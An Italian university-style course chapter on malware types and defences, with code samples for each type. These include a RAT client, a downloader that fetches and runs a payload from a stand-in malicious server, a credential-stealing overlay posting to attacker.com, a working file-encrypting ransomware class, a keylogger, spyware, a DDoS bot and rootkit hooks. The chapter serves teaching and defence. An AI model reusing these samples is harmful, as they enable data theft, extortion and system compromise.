# Capitolo 31 - Tipologie di Malware

> **Corso**: Sistemi e Reti 3  
> **Parte**: 9 - Malware e Minacce  
> **Autore**: Prof. Filippo Bilardo

---

## Introduzione

Questo capitolo analizza in dettaglio le **principali tipologie di malware**, le loro caratteristiche, tecniche di propagazione e metodi di rilevamento.

### Obiettivi di Apprendimento
- Distinguere tra diverse categorie di malware
- Comprendere i meccanismi di funzionamento
- Identificare indicatori di compromissione (IOC)
- Applicare tecniche di protezione specifiche

---

## 1. Virus Informatici

### Definizione

Un **virus** è un tipo di malware che si replica inserendo il proprio codice in altri programmi o file eseguibili.

### Caratteristiche

- **Necessita di un host**: si attacca a file eseguibili (.exe, .com, .dll)
- **Richiede interazione**: l'utente deve eseguire il file infetto
- **Si auto-replica**: copia il proprio codice in altri file
- **Payload variabile**: può essere distruttivo o silenzioso

### Tipi di Virus

#### 1.1 Virus File Infector

```
┌─────────────┐
│ Program.exe │ (Pulito)
└─────────────┘
      ↓
┌─────────────┐
│ VIRUS CODE  │ ← Codice virus aggiunto
├─────────────┤
│ Program.exe │ ← Codice originale
└─────────────┘
```

#### 1.2 Virus Boot Sector

Infetta il Master Boot Record (MBR) del disco.

```bash
# Visualizza MBR (Linux)
sudo dd if=/dev/sda bs=512 count=1 | hexdump -C
```

#### 1.3 Virus Macro

Contenuto in documenti Office (Word, Excel):

```vba
' Esempio semplificato di virus macro
Sub AutoOpen()
    ' Eseguito all'apertura del documento
    Call InfectOtherDocs
    Call DownloadPayload
End Sub

Sub InfectOtherDocs()
    ' Copia macro in altri documenti
    For Each doc In Documents
        ' Codice di infezione
    Next
End Sub
```

#### 1.4 Virus Polimorfico

Cambia la propria firma ad ogni infezione:

```python
import random
import hashlib

def polymorphic_virus():
    """Simulazione concettuale di virus polimorfico"""
    
    # Codice funzionale del virus
    malicious_code = "payload_function()"
    
    # Aggiungi "junk code" random
    junk = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100))
    
    # Combina codice
    variant = f"# {junk}\n{malicious_code}"
    
    # Ogni variante ha hash diverso
    signature = hashlib.md5(variant.encode()).hexdigest()
    
    return variant, signature

# Genera 3 varianti
for i in range(3):
    code, sig = polymorphic_virus()
    print(f"Variante {i+1} - Firma: {sig}")
```

### Rilevamento Virus

```bash
# ClamAV
clamscan -r --bell -i /home/user/

# Con log dettagliato
clamscan -r -l virus_scan.log /home/user/
```

---

## 2. Worm

### Definizione

Un **worm** è un malware auto-replicante che si diffonde **autonomamente** attraverso la rete, senza bisogno di file host.

### Caratteristiche

- **Autonomo**: non necessita interazione utente
- **Auto-propagante**: cerca attivamente nuove vittime
- **Sfrutta vulnerabilità**: exploit di rete o social engineering
- **Può sovraccaricare reti**: con il traffico di replicazione

### Esempi Storici

#### 2.1 Morris Worm (1988)

Primo worm Internet che causò danni significativi:

```python
# Pseudo-codice semplificato Morris Worm
def morris_worm():
    # 1. Trova host vulnerabili
    targets = scan_network()
    
    for target in targets:
        # 2. Tenta exploit
        if exploit_sendmail(target):
            infect(target)
        elif exploit_finger(target):
            infect(target)
        elif bruteforce_rsh(target):
            infect(target)
    
    # 3. Bug: si replicava anche su host già infetti
    # causando sovraccarico
```

#### 2.2 WannaCry (2017)

Ransomware worm che sfruttava EternalBlue:

```python
import socket

def wannacry_scan():
    """Simulazione scansione WannaCry (SOLO A SCOPO EDUCATIVO)"""
    
    # WannaCry scansionava porte SMB
    port = 445  # SMB
    
    def check_host(ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    # Scansiona subnet
    base_ip = "192.168.1."
    vulnerable = []
    
    for i in range(1, 255):
        ip = base_ip + str(i)
        if check_host(ip):
            vulnerable.append(ip)
            print(f"Host vulnerabile trovato: {ip}")
    
    return vulnerable

# ⚠️ NON ESEGUIRE SU RETI DI PRODUZIONE!
```

#### 2.3 Conficker (2008)

Sfruttava MS08-067 (Windows RPC):

```
1. Scansiona rete per SMB aperto
2. Sfrutta vulnerabilità RPC
3. Copia se stesso sulla vittima
4. Registra servizio Windows
5. Crea meccanismi persistenza
6. Connette a C&C tramite DGA (Domain Generation Algorithm)
```

### Domain Generation Algorithm (DGA)

```python
import hashlib
from datetime import datetime

def generate_domains(seed, date, count=10):
    """Genera domini usando DGA (come Conficker)"""
    
    domains = []
    domain_suffix = ['.com', '.net', '.org']
    
    for i in range(count):
        # Combina seed, data, counter
        data = f"{seed}{date.strftime('%Y%m%d')}{i}"
        
        # Hash
        hash_obj = hashlib.md5(data.encode())
        domain_name = hash_obj.hexdigest()[:12]
        
        # Aggiungi TLD
        domain = domain_name + domain_suffix[i % 3]
        domains.append(domain)
    
    return domains

# Esempio
today = datetime.now()
c2_domains = generate_domains("conficker", today, 5)
print("Domini C&C del giorno:")
for d in c2_domains:
    print(f"  - {d}")
```

### Protezione dai Worm

```bash
#!/bin/bash
# Script protezione worm

# 1. Firewall
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing

# 2. Blocca porte rischiose
sudo ufw deny 445  # SMB
sudo ufw deny 135  # RPC
sudo ufw deny 139  # NetBIOS

# 3. IDS/IPS
sudo apt install snort
sudo snort -A console -c /etc/snort/snort.conf -i eth0

# 4. Aggiornamenti automatici
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

---

## 3. Trojan

### Definizione

Un **Trojan** (cavallo di Troia) è un malware mascherato da software legittimo che contiene funzionalità dannose nascoste.

### Caratteristiche

- **Ingannevole**: appare come programma utile
- **Non si auto-replica**: a differenza di virus e worm
- **Backdoor**: spesso crea accesso remoto
- **Varie funzioni**: keylogging, furto dati, botnet

### Tipologie Trojan

#### 3.1 Remote Access Trojan (RAT)

```python
# Esempio EDUCATIVO di RAT client (non completo)
import socket
import subprocess
import os

class SimplifiedRAT:
    def __init__(self, c2_ip, c2_port):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
    
    def connect(self):
        """Connette al server C&C"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.c2_ip, self.c2_port))
            return True
        except:
            return False
    
    def execute_command(self, cmd):
        """Esegue comando ricevuto"""
        try:
            result = subprocess.check_output(cmd, shell=True, 
                                           stderr=subprocess.STDOUT)
            return result.decode()
        except Exception as e:
            return str(e)
    
    def run(self):
        """Loop principale"""
        while True:
            # Ricevi comando dal C&C
            cmd = self.sock.recv(1024).decode()
            
            if cmd == 'exit':
                break
            
            # Esegui e invia risultato
            output = self.execute_command(cmd)
            self.sock.send(output.encode())
        
        self.sock.close()

# ⚠️ SOLO A SCOPO EDUCATIVO - NON UTILIZZARE
```

#### 3.2 Banking Trojan

Ruba credenziali bancarie:

```python
import re
from urllib.parse import urlparse

class BankingTrojanSimulation:
    """Simulazione comportamento banking trojan"""
    
    def __init__(self):
        # Lista banche target
        self.target_banks = [
            'bancaintesa.it',
            'unicredit.it',
            'poste.it'
        ]
    
    def is_banking_site(self, url):
        """Verifica se URL è sito bancario"""
        domain = urlparse(url).netloc
        for bank in self.target_banks:
            if bank in domain:
                return True
        return False
    
    def inject_overlay(self, page_content):
        """Inietta form overlay fake"""
        fake_form = """
        <div id="fake-auth">
            <form action="http://attacker.com/steal.php" method="POST">
                Username: <input name="user"><br>
                Password: <input name="pass"><br>
                OTP: <input name="otp"><br>
                <button>Login</button>
            </form>
        </div>
        """
        return page_content + fake_form
    
    def extract_credentials(self, form_data):
        """Estrae e invia credenziali"""
        # In trojan reale: invia a C&C
        pass

# Esempio funzionamento
trojan = BankingTrojanSimulation()
if trojan.is_banking_site("https://www.bancaintesa.it/login"):
    print("⚠️ Trojan attivo: intercetta credenziali")
```

#### 3.3 Downloader Trojan

```python
import requests
import os

def downloader_trojan():
    """Scarica e esegue payload aggiuntivo"""
    
    # URL payload (spesso offuscato)
    payload_url = "http://malicious-server.com/payload.exe"
    
    # Scarica in cartella temporanea
    temp_path = os.path.join(os.environ['TEMP'], 'update.exe')
    
    try:
        response = requests.get(payload_url)
        with open(temp_path, 'wb') as f:
            f.write(response.content)
        
        # Esegue payload
        os.system(temp_path)
        
        # Elimina tracce
        os.remove(temp_path)
    except:
        pass

# ⚠️ ESEMPIO EDUCATIVO - NON ESEGUIRE
```

### Rilevamento Trojan

```bash
# Netstat: connessioni sospette
netstat -tulpn | grep ESTABLISHED

# Processi sospetti
ps aux | grep -v "root\|daemon" | less

# Analisi con Wireshark
sudo wireshark -i eth0 -k -f "tcp port 4444 or tcp port 31337"

# Verifica integrità sistema (Tripwire)
sudo tripwire --check
```

---

## 4. Ransomware

### Definizione

**Ransomware** cifra i dati della vittima e richiede un riscatto per la decifratura.

### Meccanismo

```
┌─────────────────────────────────────────────┐
│ 1. INFEZIONE                                │
│    Email, RDP, Exploit                      │
└──────────────┬──────────────────────────────┘
               ↓
┌─────────────────────────────────────────────┐
│ 2. GENERAZIONE CHIAVI                       │
│    RSA-4096 keypair                         │
│    - Public key (locale)                    │
│    - Private key (su server C&C)            │
└──────────────┬──────────────────────────────┘
               ↓
┌─────────────────────────────────────────────┐
│ 3. CIFRATURA FILE                           │
│    AES-256 per ogni file                    │
│    Chiave AES cifrata con RSA public        │
└──────────────┬──────────────────────────────┘
               ↓
┌─────────────────────────────────────────────┐
│ 4. RICHIESTA RISCATTO                       │
│    Bitcoin, Monero                          │
│    Countdown timer                          │
└─────────────────────────────────────────────┘
```

### Esempio Semplificato

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import os

class RansomwareSimulation:
    """SOLO SCOPO EDUCATIVO - Simulazione ransomware"""
    
    def __init__(self):
        # Genera coppia chiavi RSA (normalmente ricevute da C&C)
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
    
    def encrypt_file(self, filepath):
        """Cifra singolo file con AES"""
        
        # 1. Genera chiave AES random
        aes_key = os.urandom(32)  # 256-bit
        iv = os.urandom(16)
        
        # 2. Leggi file
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        
        # 3. Cifra con AES
        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Padding PKCS7
        padding_length = 16 - (len(plaintext) % 16)
        plaintext += bytes([padding_length]) * padding_length
        
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        # 4. Cifra chiave AES con RSA
        encrypted_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # 5. Salva file cifrato
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted_key)  # Chiave AES cifrata
            f.write(iv)             # IV
            f.write(ciphertext)     # Dati cifrati
        
        # 6. Elimina originale
        os.remove(filepath)
        
        return True
    
    def decrypt_file(self, filepath):
        """Decifra file (richiede chiave privata)"""
        
        with open(filepath, 'rb') as f:
            encrypted_key = f.read(256)  # RSA-2048 = 256 byte
            iv = f.read(16)
            ciphertext = f.read()
        
        # 1. Decifra chiave AES con RSA private key
        aes_key = self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # 2. Decifra file con AES
        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # 3. Rimuovi padding
        padding_length = plaintext[-1]
        plaintext = plaintext[:-padding_length]
        
        # 4. Salva file originale
        original_path = filepath.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(plaintext)
        
        os.remove(filepath)
        return True

# ⚠️ ESEMPIO EDUCATIVO - MAI UTILIZZARE PER SCOPI MALEVOLI
```

### Protezione Ransomware

```bash
#!/bin/bash
# Script protezione ransomware

# 1. Backup automatici
sudo apt install rsync
rsync -av --delete /home/user/ /backup/user/

# 2. Snapshot filesystem (Btrfs/ZFS)
sudo btrfs subvolume snapshot /home /home/.snapshots/$(date +%Y%m%d)

# 3. Monitora modifiche massive file
#!/bin/bash
# detect_ransomware.sh
WATCH_DIR="/home/user/Documents"
THRESHOLD=10  # File cifrati in 60 secondi

count=$(find $WATCH_DIR -name "*.encrypted" -mmin -1 | wc -l)

if [ $count -gt $THRESHOLD ]; then
    echo "⚠️ POSSIBILE RANSOMWARE!"
    # Blocca processo sospetto
    # Notifica amministratore
fi

# 4. Immunizzazione con file esca
touch /home/user/Documents/IMPORTANT_DOCUMENT.pdf
chmod 444 /home/user/Documents/IMPORTANT_DOCUMENT.pdf
# Monitor accesso a questo file
```

---

## 5. Spyware e Keylogger

### Spyware

Software che raccoglie informazioni senza consenso:

```python
import pyautogui
import time
from PIL import Image
import io

class SpywareSimulation:
    """Simulazione spyware (SOLO EDUCATIVO)"""
    
    def __init__(self, interval=60):
        self.interval = interval
    
    def capture_screenshot(self):
        """Cattura screenshot"""
        screenshot = pyautogui.screenshot()
        
        # Comprimi e invia a C&C
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='JPEG', quality=50)
        
        return img_buffer.getvalue()
    
    def get_active_window(self):
        """Ottiene finestra attiva"""
        # Windows
        import win32gui
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    
    def monitor_clipboard(self):
        """Monitora clipboard"""
        import pyperclip
        last_clipboard = ""
        
        while True:
            current = pyperclip.paste()
            if current != last_clipboard:
                # Nuovo contenuto copiato
                self.send_to_c2(f"Clipboard: {current}")
                last_clipboard = current
            time.sleep(1)

# ⚠️ NON UTILIZZARE
```

### Keylogger

```python
from pynput import keyboard

class KeyloggerSimulation:
    """Simulazione keylogger (SOLO EDUCATIVO)"""
    
    def __init__(self):
        self.log = ""
    
    def on_press(self, key):
        """Cattura tasto premuto"""
        try:
            # Carattere normale
            self.log += key.char
        except AttributeError:
            # Tasto speciale
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
                self.send_log()  # Invia al C&C
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
    
    def send_log(self):
        """Invia log al server C&C"""
        # In keylogger reale: POST a server remoto
        print(f"[LOGGED]: {self.log}")
        self.log = ""
    
    def start(self):
        """Avvia listener"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# ⚠️ ESEMPIO EDUCATIVO - ILLEGALE SE USATO SENZA CONSENSO
```

### Rilevamento Keylogger

```python
import psutil
import os

def detect_keylogger():
    """Cerca processi sospetti con hook tastiera"""
    
    suspicious_modules = [
        'pynput', 'keyboard', 'pyautogui', 'pyscreenshot'
    ]
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = ' '.join(proc.info['cmdline'] or [])
            
            for module in suspicious_modules:
                if module in cmdline.lower():
                    print(f"⚠️ Processo sospetto: {proc.info['name']} (PID: {proc.info['pid']})")
                    print(f"   Comando: {cmdline}")
        except:
            pass

detect_keylogger()
```

---

## 6. Rootkit

### Definizione

Un **rootkit** è malware che si nasconde nel sistema operativo a livello profondo, rendendo difficile il rilevamento.

### Tipologie

#### 6.1 User-mode Rootkit

Opera a livello applicativo:

```c
// Esempio: hook funzione libc (Linux)
#include <dlfcn.h>
#include <string.h>

// Puntatore a funzione originale
static int (*original_open)(const char*, int, ...) = NULL;

// Funzione hook
int open(const char *path, int flags, ...) {
    // Carica funzione originale
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }
    
    // Nascondi file specifico
    if (strstr(path, "malware.so")) {
        return -1;  // File "non trovato"
    }
    
    // Altrimenti chiama funzione originale
    return original_open(path, flags);
}
```

#### 6.2 Kernel-mode Rootkit

Opera nel kernel:

```c
// Esempio: Linux Kernel Module (LKM) rootkit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

// Hook sys_call_table
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = original_getdents(fd, dirp, count);
    
    // Nascondi file che iniziano con "rootkit_"
    // ... codice di filtraggio ...
    
    return ret;
}

int init_module(void) {
    // Installa hook
    // ...
    return 0;
}

// ⚠️ SOLO A SCOPO EDUCATIVO
```

### Rilevamento Rootkit

```bash
# 1. chkrootkit
sudo apt install chkrootkit
sudo chkrootkit

# 2. rkhunter
sudo apt install rkhunter
sudo rkhunter --update
sudo rkhunter --check

# 3. OSSEC (HIDS)
# Monitora integrità file di sistema

# 4. Analisi memoria (Volatility)
sudo apt install volatility
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_pslist
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_hidden_modules

# 5. Boot da live CD
# Analizza sistema "da fuori" per evitare hooks
```

---

## 7. Adware

### Definizione

**Adware** visualizza pubblicità indesiderata. Meno pericoloso ma fastidioso e può tracciare utente.

### Esempio

```javascript
// Adware JavaScript iniettato in browser
(function() {
    // Crea popup pubblicitario
    function showAd() {
        const ad = document.createElement('div');
        ad.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 99999;
        `;
        ad.innerHTML = `
            <iframe src="http://ads.malicious.com/popup.html"></iframe>
        `;
        document.body.appendChild(ad);
    }
    
    // Tracking
    function trackUser() {
        fetch('http://tracker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                url: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent
            })
        });
    }
    
    // Modifica risultati ricerca
    document.querySelectorAll('a').forEach(link => {
        link.href = 'http://ads.com/redirect?target=' + encodeURIComponent(link.href);
    });
    
    trackUser();
    setInterval(showAd, 60000);  // Popup ogni minuto
})();
```

### Rimozione Adware

```bash
# 1. AdwCleaner (Windows)
# Download e scansione

# 2. Malwarebytes
sudo apt install malwarebytes  # Per Linux esiste versione limitata

# 3. Rimuovi estensioni browser sospette
# Chrome: chrome://extensions/
# Firefox: about:addons

# 4. Reset browser
rm -rf ~/.config/google-chrome/
rm -rf ~/.mozilla/firefox/

# 5. Pulisci DNS cache
sudo systemd-resolve --flush-caches
```

---

## 8. Botnet e DDoS

### Botnet

Rete di computer infetti controllati da attaccante:

```python
# Bot client (zombie)
import socket
import threading
import requests

class Bot:
    def __init__(self, c2_server, port):
        self.c2_server = c2_server
        self.port = port
        self.running = False
    
    def connect_to_c2(self):
        """Connetti al Command & Control"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.c2_server, self.port))
        self.running = True
    
    def listen_commands(self):
        """Ascolta comandi dal C&C"""
        while self.running:
            try:
                cmd = self.sock.recv(1024).decode()
                self.execute_command(cmd)
            except:
                break
    
    def execute_command(self, cmd):
        """Esegui comando ricevuto"""
        if cmd.startswith('DDOS'):
            target = cmd.split()[1]
            self.ddos_attack(target)
        elif cmd.startswith('SPAM'):
            email_list = cmd.split()[1]
            self.send_spam(email_list)
        elif cmd.startswith('UPDATE'):
            url = cmd.split()[1]
            self.update_bot(url)
    
    def ddos_attack(self, target):
        """Attacco DDoS HTTP flood"""
        def flood():
            while self.running:
                try:
                    requests.get(target, timeout=1)
                except:
                    pass
        
        # Avvia 100 thread
        for _ in range(100):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()

# ⚠️ SOLO SCOPO EDUCATIVO - ILLEGALE
```

### Mitigazione DDoS

```bash
# 1. Rate limiting (iptables)
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# 2. SYN cookies (protegge da SYN flood)
sudo sysctl -w net.ipv4.tcp_syncookies=1

# 3. Fail2ban
sudo apt install fail2ban
sudo systemctl enable fail2ban

# /etc/fail2ban/jail.local
[http-get-dos]
enabled = true
port = http,https
filter = http-get-dos
logpath = /var/log/apache2/access.log
maxretry = 300
findtime = 300
bantime = 600

# 4. CloudFlare / CDN
# Protezione DDoS a livello DNS
```

---

## Comparazione Malware

| Tipo | Auto-replica | Host necessario | Propagazione | Scopo principale |
|------|--------------|-----------------|--------------|------------------|
| **Virus** | ✅ | ✅ | Manuale (utente) | Infezione file |
| **Worm** | ✅ | ❌ | Automatica (rete) | Diffusione rapida |
| **Trojan** | ❌ | ❌ | Social engineering | Backdoor/furto dati |
| **Ransomware** | ❌ | ❌ | Varia | Estorsione |
| **Spyware** | ❌ | ❌ | Bundling/exploit | Sorveglianza |
| **Rootkit** | ❌ | ❌ | Post-compromissione | Persistenza nascosta |
| **Adware** | ❌ | ❌ | Bundling | Profitto pubblicitario |

---

## Best Practices Difesa

### Prevenzione Stratificata

```
┌─────────────────────────────────────┐
│ 1. Educazione Utenti                │ ← Prima linea
├─────────────────────────────────────┤
│ 2. Email Filtering (SPF, DKIM)      │
├─────────────────────────────────────┤
│ 3. Firewall + IDS/IPS                │
├─────────────────────────────────────┤
│ 4. Antivirus/EDR                     │
├─────────────────────────────────────┤
│ 5. Application Whitelisting          │
├─────────────────────────────────────┤
│ 6. Least Privilege                   │
├─────────────────────────────────────┤
│ 7. Backup Immutabili                 │ ← Ultima linea
└─────────────────────────────────────┘
```

### Script Hardening

```bash
#!/bin/bash
# hardening.sh - Protezione base Linux

# 1. Aggiornamenti automatici
apt install unattended-upgrades
dpkg-reconfigure --priority=low unattended-upgrades

# 2. Firewall
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp  # SSH
ufw enable

# 3. Fail2ban
apt install fail2ban
systemctl enable fail2ban

# 4. Disabilita servizi non necessari
systemctl disable bluetooth
systemctl disable cups

# 5. Permessi stretti
chmod 700 /home/*
chmod 600 ~/.ssh/authorized_keys

# 6. Audit logging
apt install auditd
systemctl enable auditd

# 7. ClamAV
apt install clamav clamav-daemon
freshclam
systemctl enable clamav-freshclam

# 8. AppArmor
systemctl enable apparmor

echo "✅ Hardening completato!"
```

---

## Esercizi

### Esercizio 31.1 - Analisi Malware (★☆☆)

Scarica un campione malware da [theZoo](https://github.com/ytisf/theZoo) in VM isolata e:
1. Calcola hash SHA-256
2. Cerca su VirusTotal
3. Estrai stringhe con `strings`
4. Identifica IOC (IP, domini, porte)

### Esercizio 31.2 - Simulatore Ransomware (★★☆)

Crea script Python che:
1. Cifra file in cartella test con AES
2. Crea nota di riscatto .txt
3. Crea script decifrazione (con password)

⚠️ **Solo in ambiente isolato!**

### Esercizio 31.3 - Honeypot (★★★)

Implementa honeypot per rilevare scansioni malware:
1. Servizio SSH falso su porta 2222
2. Logga tentativi connessione
3. Analizza pattern attacco
4. Crea report IOC

---

## Domande di Verifica

1. Qual è la differenza principale tra virus e worm?
2. Come funziona Domain Generation Algorithm (DGA) usato da worm moderni?
3. Perché i ransomware usano combinazione RSA + AES invece di solo AES?
4. Come può un rootkit kernel-mode nascondersi da antivirus?
5. Quali sono i 3 principali vettori di infezione trojan?
6. Come proteggere efficacemente da ransomware?
7. Quali strumenti si usano per rilevare rootkit?
8. Cosa rende un virus polimorfico difficile da rilevare?

---

## Riferimenti

### Database Malware
- **VirusTotal**: https://www.virustotal.com
- **Hybrid Analysis**: https://www.hybrid-analysis.com
- **ANY.RUN**: https://app.any.run
- **MalwareBazaar**: https://bazaar.abuse.ch

### Framework
- **MITRE ATT&CK**: https://attack.mitre.org
- **Cyber Kill Chain**: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html

### Tool Analisi
- **Ghidra**: https://ghidra-sre.org
- **IDA Pro**: https://hex-rays.com/ida-pro
- **Volatility**: https://www.volatilityfoundation.org
- **YARA**: https://virustotal.github.io/yara

---

**Capitolo Precedente**: [31 - Introduzione al Malware](31_introduzione_al_malware.md)  
**Prossimo Capitolo**: [32 - Side-Channel Attacks](32_side-channel_attacks.md)
